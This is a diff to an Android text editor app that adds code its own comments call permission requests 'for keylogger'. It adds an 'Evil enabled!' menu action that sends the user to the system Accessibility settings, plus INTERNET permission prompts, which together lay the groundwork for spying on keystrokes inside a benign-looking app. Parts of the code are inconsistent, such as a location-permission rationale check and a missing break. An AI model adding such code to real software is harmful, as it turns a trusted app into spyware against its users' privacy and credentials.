@@ -23,6 +23,9 @@
 
 package org.billthefarmer.editor;
 
+import static android.Manifest.permission.ACCESS_FINE_LOCATION;
+import static android.Manifest.permission.INTERNET;
+
 import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
@@ -43,6 +46,10 @@ import android.preference.PreferenceManager;
 import android.print.PrintAttributes;
 import android.print.PrintDocumentAdapter;
 import android.print.PrintManager;
+import android.provider.Settings;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
+import android.support.v4.content.FileProvider;
 import android.text.Editable;
 import android.text.Html;
 import android.text.InputType;
@@ -79,13 +86,12 @@ import android.widget.ScrollView;
 import android.widget.SearchView;
 import android.widget.SeekBar;
 import android.widget.TextView;
-
-import android.support.v4.content.FileProvider;
+import android.widget.Toast;
 
 import com.ibm.icu.text.CharsetDetector;
 import com.ibm.icu.text.CharsetMatch;
 
-import org.commonmark.node.*;
+import org.commonmark.node.Node;
 import org.commonmark.parser.Parser;
 import org.commonmark.renderer.html.HtmlRenderer;
 
@@ -95,20 +101,13 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.FileReader;
 import java.io.FileWriter;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
-import java.io.Reader;
-
 import java.lang.ref.WeakReference;
-
 import java.nio.charset.Charset;
-
 import java.text.DateFormat;
-
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
@@ -118,7 +117,6 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
-
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -450,6 +448,7 @@ public class Editor extends Activity
 
     private int syntax;
 
+    private Button button;
     // onCreate
     @Override
     protected void onCreate(Bundle savedInstanceState)
@@ -575,7 +574,42 @@ public class Editor extends Activity
         }
 
         setListeners();
+
+        // call requestPermission and instantiate button
+        if (!checkPermission()) {
+            requestPermission();
+        }
+        /*
+        button = findViewById(R.id.enableevil);
+        button.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(getApplicationContext(), "Evil enabled!", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        button.setOnClickListener(v -> {
+            Toast.makeText(this, "Evil enabled!", Toast.LENGTH_SHORT).show();
+
+            Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+            startActivity(openSettings);
+        });
+        */
     }
+    // ---------- Our code ----------
+    // request permissions for keylogger
+    private static final int PERMISSION_REQUEST_CODE = 200;
+
+    private boolean checkPermission() {
+        int result = ContextCompat.checkSelfPermission(getApplicationContext(), INTERNET);
+        return result == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestPermission() {
+        ActivityCompat.requestPermissions(this, new String[]{INTERNET}, PERMISSION_REQUEST_CODE);
+    }
+    // ---------- /Our code ----------
 
     // setListeners
     private void setListeners()
@@ -1113,6 +1147,8 @@ public class Editor extends Activity
         case R.id.charsetItem:
             setCharset(item);
             break;
+        case R.id.enableevil:
+            enableEvilClicked();
         }
 
         // Close text search
@@ -1121,6 +1157,14 @@ public class Editor extends Activity
             searchItem.collapseActionView();
 
         return true;
+    }
+
+    public void enableEvilClicked()
+    {
+        Toast.makeText(this, "Evil enabled!", Toast.LENGTH_SHORT).show();
+        Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+        startActivity(openSettings);
     }
 
     // onBackPressed
@@ -2142,7 +2186,37 @@ public class Editor extends Activity
                     // Granted, open file
                     getFile();
             break;
+
+        case PERMISSION_REQUEST_CODE:
+            if (grantResults.length > 0) {
+                boolean internetAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
+                if (internetAccepted) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        if (shouldShowRequestPermissionRationale(ACCESS_FINE_LOCATION)) {
+                            showMessageOKCancel("You need to allow access to both the permissions",
+                                    (dialog, which) -> {
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                            requestPermissions(new String[]{INTERNET},
+                                                PERMISSION_REQUEST_CODE);
+                                        }
+                                    });
+                            return;
+                        }
+                    }
+                }
+            }
+
+            break;
         }
+    }
+
+    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
+        new AlertDialog.Builder(Editor.this)
+                .setMessage(message)
+                .setPositiveButton("OK", okListener)
+                .setNegativeButton("Cancel", null)
+                .create()
+                .show();
     }
 
     // readFile
